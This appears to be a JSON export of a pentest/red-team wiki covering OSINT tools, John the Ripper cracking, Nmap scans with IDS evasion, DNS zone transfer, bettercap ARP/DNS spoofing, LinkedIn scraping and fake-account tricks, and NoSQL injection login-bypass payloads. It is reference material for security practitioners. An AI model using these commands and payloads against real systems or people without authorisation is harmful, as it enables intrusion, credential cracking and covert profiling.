	"content": " General Informations https://github.com/twelvesec/gasmask # All in one information gathering tool # Automated tool used to gather information on the following sources : # - ask, bing, crt, censys.io, dns, dnsdumpster, dogpile, github # - google, googleplus, instagram, linkedin, netcraft, pgp # - reddit, reverse dns, twitter, vhosts, virustotal, whois, # - yahoo, yandex, youtube # 2 modes : Basic \u0026amp; Nongoogle # - whois/dns/reverse DNS/bing virtual hosts # - search in other engines # API Keys needed : shodan, censys, \nUsage ______ __ ___ __ __ / ____/___ ______/ |/ /___ ______/ //_/ / / __/ __ `/ ___/ /|_/ / __ `/ ___/ ,\u0026lt; / /_/ / /_/ (__ ) / / / /_/ (__ ) /| | \\____/\\__,_/____/_/ /_/\\__,_/____/_/ |_| GasMasK - All in one Information gathering tool - OSINT Ver. 1.2 Written by: @maldevel, @mikismaos, @xvass https://www.twelvesec.com/ usage: gasmask.py [-h] [-d DOMAIN] [-s NAMESERVER] [-x PROXY] [-l LIMIT] [-i MODE] [-o BASENAME] [-m MATCH] [-f FILTER] [--count] [-R REPORT] [-B REPORT_BUCKET] [-1 CENSYS_API_ID] [-2 CENSYS_API_SECRET] [-r] [-u] [-a ASN] [-c COUNTRY] [-O CERT_ORG] [-I CERT_ISSUER] [-z CERT_HOST] [-S HTTP_SERVER] [-t HTML_TITLE] [-b HTML_BODY] [-T TAGS] [-L LIMIT] [-D] [-v] [-H] [arguments [arguments ...]] positional arguments: arguments Censys query optional arguments: -h --help, show this help message and exit -d DOMAIN, --domain DOMAIN, Domain to search. -s NAMESERVER, --server NAMESERVER, DNS server to use. -x PROXY, --proxy, PROXY Use a proxy server when retrieving results from search engines (eg. \u0026#39;-x http://127.0.0.1:8080\u0026#39;) -l LIMIT, --limit, LIMIT Limit the number of search engine results (default: 100). -i MODE, --info MODE Limit information gathering (basic,whois,dns,revdns,vhosts,google,bing,yahoo,ask,dogpile,yandex,censys,linkedin,twitter,googleplus,youtube,reddit,github,instagram,crt,pgp,netcraft,virustotal,dnsdump). -o BASENAME, --output BASENAME, Output in the four major formats at once (markdown, txt, xml and html). -k API-KEY, --shodan-key API-KEY API key to use with Shodan search (MODE=\u0026#34;shodan\u0026#34;) -m MATCH, --match MATCH, Highlight a string within an existing query result -f FILTER, --filter FILTER Filter the JSON keys to display for each result (use value \u0026#39;help\u0026#39; for interesting fields) --count, Print the count result and exit -R REPORT, --report REPORT, Stats on given field (use value \u0026#39;help\u0026#39; for listing interesting fields) -B REPORT_BUCKET, --report_bucket REPORT_BUCKET, Bucket length in report mode (default: 50) -1 CENSYS_API_ID, --censys_api_id CENSYS_API_ID, Provide the authentication ID for the censys.io search engine -2 CENSYS_API_SECRET, --censys_api_secret CENSYS_API_SECRET, Provide the secret hash for the censys.io search engine -r, --read_api_keys, Read the API Keys stored in api_keys.txt file. (e.g. \u0026#39;-i censys -r\u0026#39;) -u, --update_api_keys, Update the API Keys stored in api_keys.txt file. (e.g. \u0026#39;-i censys -u\u0026#39;) -a ASN, --asn ASN, Filter with ASN (e.g 5408 for GR-NET AS) -c COUNTRY, --country COUNTRY, Filter with country -O CERT_ORG, --cert-org CERT_ORG, Certificate issued to organization -I CERT_ISSUER, --cert-issuer CERT_ISSUER, Certificate issued by organization -z CERT_HOST, --cert-host CERT_HOST, hostname Certificate is issued to -S HTTP_SERVER, --http-server HTTP_SERVER, Server header -t HTML_TITLE, --html-title HTML_TITLE, Filter on html page title -b HTML_BODY, --html-body HTML_BODY, Filter on html body content -T TAGS, --tags TAGS, Filter on specific tags. e.g: -T tag1,tag2,... (use keyword \u0026#39;list\u0026#39; to list usual tags -L LIMIT, --Limit LIMIT, Limit to N results ( this is for censys.io ) -D, --debug, Debug informations -v, --verbose, Print raw JSON records -H, --html, Renders html elements in a browser \nUsage example # Specifiyng mode python gasmask.py -d example.com -i basic python gasmask.py -d example.com -i dnsdump python gasmask.py -d example.com -i shodan -k xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx python gasmask.py -d example.com -i whois,dns,revdns python gasmask.py -d example.com -i basic,yahoo,github -o myresults/example_com_search_results # Censys.io example python gasmask.py -i censys --Limit 10 nessus python gasmask.py -i censys -I SAP --report location.country.raw --report_bucket 10 python gasmask.py -i censys --html-title \u0026#34;Hacked By\u0026#34; --Limit 10 --html python gasmask.py -i censys --tags heartbleed --report location.country.raw python gasmask.py -i censys -S NGINX --count python gasmask.py -i censys -d example.com python gasmask.py -i censys -t \u0026#34;Internal Server Error\u0026#34; -S Apache -m \u0026#34;HTTP 500\u0026#34; --Limit 15"
},
{
	"uri": "/passcracking-hashfiles/john_cheatsheet/",
	"title": "John Cheatsheet",
	"tags": [],
	"description": "",
	"content": " Cracking Modes # Dictionnary attack ./john --wordlist=password.lst hashFile # Dictionnary attack using default or specific rules ./john --wordlist=password.lst --rules=rulename hashFile ./john --wordlist=password.lst --rules mypasswd # Incremental mode ./john --incremental hashFile # Loopback attack (password are taken from the potfile) ./john --loopback hashFile # Mask bruteforce attack ./john --mask=?1?1?1?1?1?1 --1=[A-Z] hashFile --min-len=8 # Dictionnary attack using masks ./john --wordlist=password.lst -mask=\u0026#39;?l?l?w?l\u0026#39; hashFile \nMISC \u0026amp; Tricks # Show hidden options ./john --list=hidden-options # Using session and restoring them ./john hashes --session=name ./john --restore=name ./john --session=allrules --wordlist=all.lst --rules mypasswd \u0026amp; ./john status # Show the potfile ./john hashes --pot=potFile --show # Search if a root/uid0 have been cracked john --show --users=0 mypasswdFile john --show --users=root mypasswdFile# List OpenCL devices and get their id ./john --list=opencl-devices # List format supported by OpenCL ./john --list=formats --format=opencl # Using multiples GPU ./john hashes --format:openclformat --wordlist:wordlist --rules:rules --dev=0,1 --fork=2 # Using multiple CPU (eg. 4 cores) ./john hashes --wordlist:wordlist --rules:rules --dev=2 --fork=4 \nWordlists \u0026amp; Incremental # Sort a wordlist for the wordlist mode tr A-Z a-z \u0026lt; SOURCE | sort -u \u0026gt; TARGET # Use a potfile to generate a new wordlist cut -d \u0026#39;:\u0026#39; -f 2 john.pot | sort -u pot.dic # Generate candidate password for slow hashes ./john --wordlist=password.lst --stdout --rules:Jumbo | ./unique -mem=25 wordlist.uniq--incremental:Lower # 26 char --incremental:Alpha # 52 char --incremental:Digits # 10 char --incremental:Alnum # 62 char # Create a new charset ./john --make-charset=charset.chr # Then set the following in the John.conf # Incremental modes [Incremental:charset] File = $JOHN/charset.chr MinLen = 0 MaxLen = 31 CharCount = 95 # Using a specific charset ./john --incremental:charset hashFile \nRules # Predefined rules --rules:Single --rules:Wordlist --rules:Extra --rules:Jumbo # All the above --rules:KoreLogic --rules:All # All the above# Create a new rule in John.conf [List.Rules:Tryout] l u ...| Rule | Description | |------------ |------------------------------------------------------- | | l | Convert to lowercase | | u | Convert to uppercase | | c | Capitalize | | l r | Lowercase the word and reverse it | | l Az\u0026#34;2015\u0026#34; | Lowercase the word and append \u0026#34;2015\u0026#34; at the end | | d | Duplicate | | l A0\u0026#34;2015\u0026#34; | Lowercase the word and append \u0026#34;2015\u0026#34; at the beginning | | A0\u0026#34;#\u0026#34;Az\u0026#34;#\u0026#34; | Add \u0026#34;#\u0026#34; at the beginning and the end of the word | | C | Lowercase the first char and uppercase the rest | | t | Toggle case of all char | | TN | Toggle the case of the char in position N | | r | Reverse the word | | f | Reflect (Fred --\u0026gt; Fredderf) | | { | Rotate the word left | | } | Rotate the word right | | $x | Append char X to the word | | ^x | Prefix the word with X char | | [ | Remove the first char from the word | | ] | Remove the last char from the word | | DN | Delete the char in position N | | xNM | Extract substring from position N for M char | | iNX | Insert char X in position N and shift the rest right | | oNX | Overstrike char in position N with X | | S | Shift case | | V | Lowercase vowels and uppercase consonants | | R | Shift each char right on the keyboard | | L | Shift each char left on the keyboard | | \u0026lt;N | Reject the word unless it is less than N char long | | \u0026gt;N | Reject the word unless it is greater than N char long | | \\\u0026#39;N | Truncate the word at length N |"
},
{
	"uri": "/network/ldap_dns/",
	"title": "LDAP &amp; DNS",
	"tags": [],
	"description": "",
	"content": " LDAP Null Bind Enumeration # Syntax ldapsearch -h \u0026#34;LENOMDELAMACHINELDAP\u0026#34; -p \u0026#34;LEPORTSURLEQUELONYACCEDE\u0026#34; -x -b \u0026#34;ou=UNE_OU_EXISTANTE,DC=QUIVABIEN,DC=SUITE,DC=FOO\u0026#34; -v \nDNS Zone Transfer # Zone transfer using dig dig @\u0026lt;ns\u0026gt; -p 54011 AXFR \u0026lt;host\u0026gt; # Zone transfer using nslookup nslookup -type=any \u0026gt; set port \u0026lt;port\u0026gt; \u0026gt; server \u0026lt;ns\u0026gt; \u0026gt; \u0026lt;host\u0026gt;# Custom PERL zone transfer #!/usr/bin/env perl use warnings; use strict; use Net::DNS; # ici je teste rapidement si j\u0026#39;ai bien installe le module Net::DNS print Net::DNS-\u0026gt;version, \u0026#34;\\n\u0026#34;; # creation de l\u0026#39;instance du resolveur maison.  # on lui indique le dns sur lequel nous allons agir # comme explique dans la description du challenge # nous indiquons aussi que nous voulons avoir des infos  # de deboggage et sans recursion. my $monResolveur = Net::DNS::Resolver-\u0026gt;new( nameservers =\u0026gt; [qw(challenge01.root-me.org)], recurse =\u0026gt; 0, debug =\u0026gt; 1, port =\u0026gt; 54011); # test du transfert de zone avec les infos exposees dans # l\u0026#39;enonce. my @maZone = $monResolveur-\u0026gt;axfr(\u0026#34;ch11.challenge01.root-me.org\u0026#34;); # si tout s\u0026#39;est bien deroule, on affiche les valeurs attendues comme avec dig ou host. if (@maZone) { foreach my $rr (@maZone) { $rr-\u0026gt;print; } } \nDNS Spoofing # Using bettercap # In a local network, you can DNS queries using ARP spoofing # Activate router mode on attacker machine echo 1 \u0026gt; /proc/sys/net/ipv4/ip_forward # Show machines in the LAN \u0026gt; net.show # Set target for ARP spoofing \u0026gt; set arp.spoof.targets 192.168.5.99 # Launch attack \u0026gt; arp.spoof on # Set domain to spoof, spoof.all allow to also consider external requests and not only local ones \u0026gt; set dns.spoof.domains apache.org \u0026gt; set dns.spoof.all true \u0026gt; dns.spoof on # You can then create a local web server \u0026gt; set http.server.path /var/www/html \u0026gt; http.server on"
},
{
	"uri": "/open-source-intelligence-osint/platforms-hunting/linkedin/",
	"title": "LinkedIn",
	"tags": [],
	"description": "",
	"content": " Tips \u0026amp; Tricks # Check the \u0026#34;see coordinates\u0026#34; on accounts # Sometimes, people link other resources# Getting likes, comment etc. /detail/recent-activity \nGetting account linked to an e-mail # Great trick https://www.intelligencewithsteve.com/post/a-guide-to-searching-linkedin-by-email-address # Sales feature have been discontinued # Log to OWA and go to contacts https://outlook.live.com/owa/ https://outlook.live.com/people # Then add contact, using the target e-mail # Go to the LinkedIn tab and connect using a fake account # If an account is linked to the target e-mail, you should now see it in Outlook \nScrapedIn # Tool created to assist in performing recon using the LinkedIn API. # Provide a search string # Ouput as XLSX but intented to work with Google Sheets # After importing you\u0026#39;ll have a dataset and report worksheet # Dataset : First name, last name, occupation, industry, profile URL, picture URL # Report : Picture (displayed), Full name, occupation, Link to profile # Full size profile photo # Then right click \u0026#34;view image\u0026#34; https://linkedin.com/in/yourprofilename/detail/photo \nlinkScrape # linkScrape is another enumeration tool # Pure Web Scrapper → It does not use the LinkedIn API # /!\\ Some bugs → LinkedIn account can be banned and needs to have 10 contacts to perform company based searches # For companies with whitespace, use simple quotes # Using a LinkedIn company ID is the most accurate way to search for a company. It\u0026#39;s also the only way to search for universities. python linkScrape.py -c 100 -r1 # To find company ID, go to the company page then \u0026#34;See all numeral employees on LinkedIn → ?facetCurrentCompany=%5B%2239624%22 Usage: python linkScrape.py \u0026lt;OPTIONS\u0026gt; Example[1]: python linkScrape.py -e LinkedInUser@email.com -c \u0026#39;Example Company\u0026#39; -r 10 -t 3 -m 7 -d example.com Example[2]: python linkScrape.py -e LinkedInUser@email.com -c \u0026#39;Example Company\u0026#39; -r 5-10 -t 3 -m 7 -d example.com Example[3]: python linkScrape.py -e LinkedInUser@email.com -c 100 -r 3 -t 3 -m 7 -d example.com Example[4]: python linkScrape.py -m 7 -i ~/Company/names.txt\\n\\\u0026#34; Formatted output saved to: linkedIn/linkScrape-data/Company-mangle[x]_time.txt Login options: -e \u0026lt;email\u0026gt; Your LinkedIn.com Email Address. -p \u0026lt;pass\u0026gt; Your LinkedIn.com Password. (If -p parameter is not defined, you\\\u0026#39;ll be prompt to enter a password) Search options: -c \u0026lt;company\u0026gt; Search company name or company ID. -r \u0026lt;results\u0026gt; Searches X number of LinkedIn.com pages, or a range of pages (Default is 1-3). -t \u0026lt;secs\u0026gt; Sets timeout value. (Default is 3.) \nPeasant # Peaseant is a scraping tool that uses the LinkedIn API # You can harvest data from a company, set a large connection campaign and even spoof a profile # Harvesting # Will generate CSV file ./peasant.py harvest -C \u0026#34;user:password\u0026#34; -cns company -of out.csv # Contact Requests ./peasant.py add_contacts -if dundermifflin.csv -C \u0026#34;$creds\u0026#34; # Spoofing ./peasant.py spoof_profile -pu paul-m-04773b1 -C \u0026#34;$creds\u0026#34; \nLinkedin2Username (https://github.com/initstring/linkedin2username) # Pure web scraper used to get username list from the employee list of a company # It will create several lists of possible username formats for all employees of a company you point it at # pull all employees of Uber python linkedin2username.py myname@email.com uber-com # Pull a shorter list and append the domain name @uber.com to them python linkedin2username.py myname@email.com uber-com -d 5 -n \u0026#39;uber.com\u0026#39;"
},
{
	"uri": "/windows-systems/local-and-physical/",
	"title": "Local and Physical",
	"tags": [],
	"description": "",
	"content": "Check menu on the left for content . .;;............ .. .;;;;::::::::::::.. ':;;:::::::::::: . . ':  "
},
{
	"uri": "/phishing-redteam-and-se/lockpicking_keys/",
	"title": "Lockpicking and Keys stuff",
	"tags": [],
	"description": "",
	"content": " Key Decoder https://github.com/MaximeBeasse/KeyDecoder https://twitter.com/FrenchKey_fr/status/1343543963454754816?s=20 \n"
},
{
	"uri": "/network/port-scanning/nmap_cheatsheet/",
	"title": "Nmap Cheatsheet",
	"tags": [],
	"description": "",
	"content": " https://github.com/Tib3rius/AutoRecon Full commands examples # Ping scan nmap -sP 192.168.0.0/24 # Quick scan nmap -T4 -F 192.168.1.1 -vvv # Quick scan plus (more info but more aggressive) nmap -sV -T4 -O -F –version-light 192.168.1.1 -vvv # TCP Syn and UDP Scan (requires root) nmap -sS -sU -PN -p T:80,T:445,U:161 192.168.1.1 # Soft nmap nmap -v -Pn -n -T4 -sT -sV --version-intensity=5 --reason 192.168.1.1 # Full nmap nmap -v -Pn -n -T4 -sT -p- --reason 192.168.1.1 # Dedicated nmap nmap -v -Pn -n -T4 -sV --version-intensity=5 -sT -p T:ports_found --reason \u0026lt;IP\u0026gt; \nTarget specification nmap 192.168.1.1 nmap 192.168.1.1-10 nmap 192.168.1.0/24 nmap google.com nmap 192.168.1.0/24 --exclude192.168.1.1 nmap -iL targets.txt \nScan techniques # TCP SYN port scan (default, root needed) nmap -sS 192.168.1.1 # TCP CONNECT port scan (default without root privilege) # Require full connection so it is slower nmap -sT 192.168.1.1 # UDP port scan nmap -sU 192.168.1.1 nmap -sA 192.168.1.1 nmap -sW 192.168.1.1 nmap -sN 192.168.1.1 # Ping scan nmap -sP 192.168.0.0/24 \nHost discovery # No scan, only list targets (get hostnames) nmap -sL 192.168.1.1 # Disable port scanning, only host discovery nmap -sn 192.168.1.1 # Disable host discovery, only port scanning, can be usefull if firewall deny PING nmap -Pn 192.168.1.1 # Disable DNS resolution nmap 192.168.1.1 -n \nServices, ports and OS (fingerprinting nmap -p 20 192.168.1.1 nmap -p 20-100 192.168.1.1 nmap -p U:53,T:25-100 192.168.1.1 nmap -p http,https 192.168.1.1 # All ports nmap -p- 192.168.1.1 # Fast port scan (100 more common ports) nmap 192.168.1.1 -F # Top X ports nmap 192.168.1.1 --top-ports 2000 # Try to get service version nmap 192.168.1.1 -sV # 0-9 nmap 192.168.1.1 -sV --version-intensity 3 # Light mode but faster nmap 192.168.1.1 -sV --version-light # Equivalent to version-intensity 9. Harder nmap 192.168.1.1 -sV --version-all # Aggressive mode (OS Detection, version, script, traceroute) nmap 192.168.1.1 -A # OS Detection using TCP/IP nmap 192.168.1.1 -O # Disable OS dection if at least one open and one closed port are not found nmap 192.168.1.1 -O --osscan-limit # OS Scan guess more aggressive nmap 192.168.1.1 -O --osscan-guess # Set the maximum number x of OS detection tries against a target nmap 192.168.1.1 -O --max-os-tries 2 \nNSE Scripts # Default script scanning, considered safe nmap 192.168.1.1 -sC nmap 192.168.1.1 --script default nmap 192.168.1.1 --script=xxx nmap 192.168.1.1 --script=xxx --script-args xx=xx # Scan default, but remove intrusive scripts nmap 192.168.1.1 --script “not intrusive\u0026#34; \nMISC # Scan speed # T0-T1 : Slow (useful for Intrusion Detection Systems evasion) # T2-T3 : Normal # T4-T5 : Agressive (Need a realiable and strong network) nmap 192.168.1.1 -T0 nmap 192.168.1.1 --host-timeout 10s # Delay between probes nmap 192.168.1.1 --scan-delay 1s nmap 192.168.1.1 --max-scan-delay 2s nmap 192.168.1.1 --max-retries 3 # No faster or no slower than 100 packets/second nmap 192.168.1.1 --min-rate 100 nmap 192.168.1.1 --max-rate 100 # If you need to scan a large network in a short period of time # You can set up a timeout value for connection attemps https://nmap.org/book/ncat-man-timing-options.html nmap 192.168.0.0/16 --host-timeout \u0026lt;msec\u0026gt; \nEvading IDS # Tiny fragmented packets nmap 192.168.1.1 -f # Set your own offset size nmap 192.168.1.1 -mtu 32 # Scan from spoofed IP nmap 192.168.1.1 -D 192.168.1.2 # Scan Facebook from Microsoft nmap -S www.microsoft.com www.facebook.com # Use a specific source port nmap 192.168.1.1 -g 53 # Proxy nmap 192.168.1.1 --proxies http://X.X.X.X:8080 # Append random data to sent packets nmap 192.168.1.1 --data-length 200 \nOutput # Save result (oN=normal oX=xml oG=grepable oA=all) nmap 192.168.1.1 -oN scanResult.file # Verbosity level (one v or more) and debugging level nmap 192.168.1.1 -vvvvvv nmap 192.168.1.1 -ddd # Reason for the port state (equivalent to -vv) nmap 192.168.1.1 --reason # Show only open ports nmap 192.168.1.1 --open # Show all packets sent and received nmap 192.168.1.1 --packets-trace # Show the host interface and routes nmap 192.168.1.1 --iflist # Resume a scan nmap --resume scan.file nmap 192.168.1.1 -vvvvvv nmap 192.168.1.1 -vvvvvv"
},
{
	"uri": "/web-pentest/injections/server-side-injections/nosql/",
	"title": "NoSQL Injections",
	"tags": [],
	"description": "",
	"content": " NoSQLMap https://github.com/codingo/NoSQLMap 1-Set options (do this first) 2-NoSQL DB Access Attacks 3-NoSQL Web App attacks 4-Scan for Anonymous MongoDB Access x-Exit \nBasic Authentication index.php?login[$regex]=a.*\u0026amp;pass[$ne]=lol index.php?login[$gt]=admin\u0026amp;login[$lt]=test\u0026amp;pass[$ne]=1 # Basic NoSQL Injection http://url?login[$nin][]=admin\u0026amp;login[$nin][]=test\u0026amp;pass[$ne]=toto \nBlind NoSQL Injection # Get size index.php ?chall_name=nosqlblind\u0026amp;flag[$regex]=.1 # Enumeration index.php ?chall_name=nosqlblind\u0026amp;flag[$regex]=3a.20"
},
{
	"uri": "/open-source-intelligence-osint/tools-and-methodology/opsec/",
	"title": "OPSEC",
	"tags": [],
	"description": "",
	"content": " [WIP]\nResources https://github.com/devbret/online-opsec/ https://anonymousplanet.github.io/thgtoa/guide.html \nTechnical OPSEC # Simple data analysis (headers, OS...) https://amiunique.org/fp # Creating profile pictures for sock # Mixing two pictures https://twitter.com/OSINTgeek/status/1258857825868156930?s=19 https://www.artbreeder.com/ # Email providers comparison https://www.privacytools.io/providers/email/ # Compilation of great ressources https://shutuptrackers.com/index.php # Windows 10 Tracking https://github.com/10se1ucgo/DisableWinTracking # Firefox Configuration Posts https://daring-india-marten-972.medium.com/osint-comment-naviguer-en-eaux-troubles-32f11ab985ac# A directory of direct links for you to obtain your data from web services. https://justgetmydata.com/ \nHuman Related OPSEC # Image Cloaking for Personal Privacy # Fawkes takes your personal images and makes tiny, pixel-level changes that are invisible to the human eye # if and when someone tries to use these photos to build a facial recognition model # \u0026#34;cloaked\u0026#34; images will teach the model an highly distorted version of what makes you look like you http://sandlab.cs.uchicago.edu/fawkes/# Lycamobile can be used to get a Burner SIM / phone number https://www.lycamobile.fr/fr/ \nWatermarking sent documents https://twitter.com/_trou_/status/1313951783182651393?s=19 # Watermarking documents sent over the Internet can help for identification if they leak # You can watermark using the company and date for example # Not perfect as it can be removed ! # In case of text watermarking it can be done through this # $1 = source file # $2 = watermark text # $3 = destination file convert -density 150 -fill \u0026#34;rgba(255,0,0,0.25)\u0026#34; -gravity Center -pointsize 80 -draw \u0026#34;rotate -45 text 0,0 \\\u0026#34;$2\\\u0026#34;\u0026#34; \u0026#34;$1\u0026#34; \u0026#34;$3\u0026#34; # Repeated text $ convert original.png \\( -background none -pointsize 35 -fill \u0026#34;rgba(255,0,0,0.30)\u0026#34; label:\u0026#34;TEXT\u0026#34; -rotate -45 -write mpr:tile +delete \\) \\( +clone -tile mpr:tile -draw \u0026#34;color 0,100 reset\u0026#34; \\) -compose over -composite watermarked.png \nBrowser Configuration # Some resources https://daring-india-marten-972.medium.com/osint-comment-naviguer-en-eaux-troubles-32f11ab985ac https://openfacto.fr/2019/09/01/firefox-iv-securiser-un-peu-plus-sa-navigation/ https://medium.com/@mattybv3/firefox-browser-settings-configuration-and-add-ons-extensions-for-privacy-security-and-osint-114e76d8a468 https://proprivacy.com/privacy-service/guides/firefox-privacy-security-guide https://www.maketecheasier.com/28-coolest-firefox-aboutconfig-tricks/# Profiles # You can first segment your browing by using different profiles about:profiles# Preferences # DNS over HTTPS (DoH) # General \u0026gt; Network network.trr.mode = 2 network.trr.uri = your resolver # Cloudflare or Quad9 (https://dns.quad9.net/dns-query)# Config # ESNI (Hide sites to your ISP) network.security.esni.enabled = true # Disable copy/paste blocking dom.event.clipboardevents.enabled = false # Disable WebRTC # You can switch using an add-on media.peerconnection.enabled = false # Auto start the private mode browser.privatebrowsing.autostart = true # Disable the Google safebrowing feature # Job already done by add-ons browser.safebrowsing.phishing.enabled = false browser.safebrowsing.malware.enabled = false # Don\u0026#39;t send report to Mozilla datareporting.healthreport.uploadEnabled = false geo.wifi.uri ? geo.enabled ? # Disable referer forwarding # Can break some sites network.http.sendRefererHeader = 0 network.http.sendSecureXSiteReferrer = false # Preload embedded links when visiting a page network.prefetch-next = false # Get sources in an external editor view_source.editor.external = true view_source.editor.path = \u0026#34;C:\\Program Files\\Sublime Text 3\\sublime_text.exe\u0026#34;"
},
{
	"uri": "/resources/osint/",
	"title": "OSINT",
	"tags": [],
	"description": "",
	"content": " Social Networks  The new Facebook Graph Search Part 1 (https://osintcurio.us/2019/08/22/the-new-facebook-graph-search-part-1/) The new Facebook Graph Search Part 2 (https://osintcurio.us/2019/08/22/the-new-facebook-graph-search-part-2/) Find Instagram User ID (https://codeofaninja.com/tools/find-instagram-user-id) Using Snapchat for OSINT (https://osintcurio.us/2020/04/13/using-snapchat-for-osint-10-minute-tip/) TikTok investigations and OSINT Tips (https://www.skopenow.com/news/tiktok-investigations-and-osint-tips)s How can we use Messenger Apps in OSINT (https://medium.com/@Ginger_T/how-can-we-use-messenger-apps-in-osint-682cbc634f) A better way to find and archive OSINT on Twitter (https://jakecreps.com/2020/04/10/threadreaderapp-osint-archive-twitter/amp/) OSINT : How to find information on anyone (https://medium.com/the-first-digit/osint-how-to-find-information-on-anyone-5029a3c7fd56) Getting a Grasp on Google ID\u0026rsquo;s (https://medium.com/week-in-osint/getting-a-grasp-on-googleids-77a8ab707e43) Gab OSINT Techniques (https://www.secjuice.com/investigate-gab-users-osint/) Reddit OSINT Techniques (https://www.secjuice.com/reddit-osint-techniques/) OSINT Investigations On Tumblr (https://www.secjuice.com/tumblr-osint/) New way for searching LinkedIn profile using e-mail (https://www.intelligencewithsteve.com/post/a-guide-to-searching-linkedin-by-email-address) Neat OSINT trick: Google Account Disclosure (https://subfn.net/2020/06/15/ga-osint-trick/) The New Digital Meeting Place; What Parler Means for OSINT Investigators (https://www.skopenow.com/news/the-new-digital-meeting-place-what-parler-means-for-osint-investigators) The Definitive Guide : Parler for OSINT Investigation (https://mktg.skopenow.com/parler-whitepaper-webinar)  Dorks  Google Dorks (https://pentest-tools.com/information-gathering/google-hacking#) Twitter Dorks (https://twitter.com/BNFC_13/status/1160890864337600512) Github Dorks (https://gist.github.com/jhaddix/77253cea49bf4bd4bfd5d384a37ce7a4)  Training/Methodology  OSINT Training and Workflow (https://www.dfir.training/osint) Website Investigation Workflow (https://twitter.com/sinwindie/status/1251320697370095617?s=20) OSINT Resources \u0026amp; Tutorials (https://www.aware-online.com/en/) Learning Overpass API (https://osmlab.github.io/learnoverpass//en/) A 5-minute guide to creating a covert account for Internet Investigations (OSINT) (https://www.intelligencewithsteve.com/post/a-5-minute-guide-to-creating-a-covert-account-for-internet-investigations-osint) hat’s in a Company? Guide for investigate a company (https://kit.exposingtheinvisible.org/en/what/companies.html) Osint : Comment naviguer en eaux troubles (https://daring-india-marten-972.medium.com/osint-comment-naviguer-en-eaux-troubles-32f11ab985ac) Amnesty International Course : Open Source Investigations for Human Rights (https://advocacyassembly.org/en/partners/amnesty/) OSINT : Explorer l\u0026rsquo;espace informationnel Russe (https://docs.google.com/document/d/10agC_MKjd25GWaSAJxEw2pTGzGuREEP78nZ6BOuaphc/edit from https://twitter.com/ConseilVfm/status/1394228368242003969?s=20) OSINT Russia Resources (https://start.me/p/0PeKwy/osint-russie-iec-ies)\n OPSEC : The Hitchhiker’s Guide to Online Anonymity (https://anonymousplanet.github.io/thgtoa/guide.html)\n OPSEC : Online Operations Security (OpSec) (https://github.com/devbret/online-opsec/)\n  Cheatsheet and Compilations  Giant Mindmap containing tools (https://osintframework.com/) https://start.me/p/ZME8nR/osint Technisette (https://start.me/p/m6XQ08/osint) YOGA (https://yoga.osint.ninja/) OSINT Cheatsheet (https://inteltechniques.com/JE/OSINT_Packet_2019.pdf) Some OSINT content and tools (https://github.com/sinwindie/OSINT) Osinttools (WebBreacher) (Cool xmind maps) (https://github.com/WebBreacher/osinttools) OSTER, Open Sources on Terrorism (https://start.me/p/7kmvEK/oster)  Blogs  Osintly (soon) (http://osintly.com/) Offensive OSINT (https://www.offensiveosint.io/) AaronCTI (https://medium.com/@AaronCTI) GIJN (https://gijn.org/) GIJN FR (https://gijn.org/gijn-en-francais/) SecJuice OSINT (https://www.secjuice.com/tag/osint/) Sector035\u0026rsquo;s blog (https://sector035.nl/)  Others  The OSINT Library (https://www.blockint.nl/the-osint-library/) Famous Search Engines (https://start.me/p/QRENnO/databases) Some OSINT Resources (https://start.me/p/rx6Qj8/start-page) OSINT Bookmarks (https://www.osintcombine.com/osint-bookmarks) Downloading PDF from Web Archive (https://openfacto.fr/2020/04/19/recuperer-des-fichiers-pdf-en-masse-sur-archive-org/) Gitrob : Putting the open source in OSINT (https://michenriksen.com/blog/gitrob-putting-the-open-source-in-osint/) Image Analysis tool : Sherloq (https://github.com/GuidoBartoli/sherloq) Radioamateurs, une source méconnue de l\u0026rsquo;OSINT (https://openfacto.fr/2020/04/27/radioamateurs-une-source-meconnue-de-losint/) OSINT Basics, enumerating firewalls and gateway (https://www.secjuice.com/osint-detecting-enumerating-firewalls-gateways/) Powerpoint, What data is beneath the surface ? (https://medium.com/@osint/powerpoint-what-data-is-beneath-the-surface-2eb000ef95fb) Pastebeen (https://pastebeen.com/) Reconnaissance faciale et OSINT – Digikam (https://openfacto.fr/2020/07/26/reconnaissance-faciale-et-osint-digikam/) OPSEC : What informations are giant tech companies collecting from you ? (https://i.imgur.com/dFnY0pu.png) Combine Reverse Image with Boolean Search to Find Who Likes What (https://booleanstrings.com/2020/08/04/combine-reverse-image-with-boolean-search-to-find-who-likes-what/) The Attrition of Information in OSINT : Why Acting Quickly Matters, And How To Recover When You Don’t. (https://nixintel.info/osint/the-attrition-of-information-in-osint-why-acting-quickly-matters-and-how-to-recover-when-you-dont/) Using Phone Contact Book Apps For Digital Research (https://www.bellingcat.com/resources/how-tos/2019/04/08/using-phone-contact-book-apps-for-digital-research/) The Most Comprehensive TweetDeck Research Guide In Existence (https://www.bellingcat.com/resources/how-tos/2019/06/21/the-most-comprehensive-tweetdeck-research-guide-in-existence-probably/) IntelOwl Project : CTI (https://github.com/intelowlproject/IntelOwl) Nixintel\u0026rsquo;s OSINT Resource List (https://start.me/p/rx6Qj8/nixintel-s-osint-resource-list) Aerial Imagery in QGIS (https://sector035.nl/articles/aerial-imagery-in-qgis) When there is no Google Earth or Street View, what can you do? (https://osintcurio.us/2020/09/28/when-there-is-no-google-earth-or-street-view-what-can-you-do/) Y a plein de mails intéressants sur yopmail.com (https://openfacto.fr/2020/10/19/y-a-plein-de-mails-interessants-sur-yopmail-com/) Shadows and Suncalc (https://medium.com/quiztime/lining-up-shadows-2351ae106cec) Using Shadows \u0026amp; Sun’s Position for OSINT (https://s0md3v.medium.com/using-shadows-suns-position-for-osint-fc2378b5f709) Measuring ship speed using waves (https://actualcontrol.substack.com/p/the-space-speedometer) Geolocating a Plane Shot Down in Ethiopia – Case Studies on Mountain Profiling with PeakVisor (https://benjaminstrick.com/geolocation-ethiopia-case-on-mountain-profiling-with-peakvisor/) Phone numbers investigation, the open source way (https://medium.com/@BTF117/phone-numbers-investigation-the-open-source-way-e7fd1716bcfd) Another Tale of Personal Data Harvesting: Alsid, Lusha.co and Simpler Apps (https://wwws.nightwatchcybersecurity.com/2020/02/20/another-tale-of-personal-data-harvesting-alsid-lusha-co-and-simpler-apps/) Kaspr Tool (https://kaspr.io/fr/)  Usable Informations  Suffixes in French city names (https://twitter.com/onlmaps/status/1249374106706825218) Military Camouflage Pattern for each country (https://www.camopedia.org/index.php?title=Main_Page) Où trouver des données en Suisse ? (https://gijn.org/2020/02/21/ou-trouver-des-donnees-en-suisse/) Sun position in over time 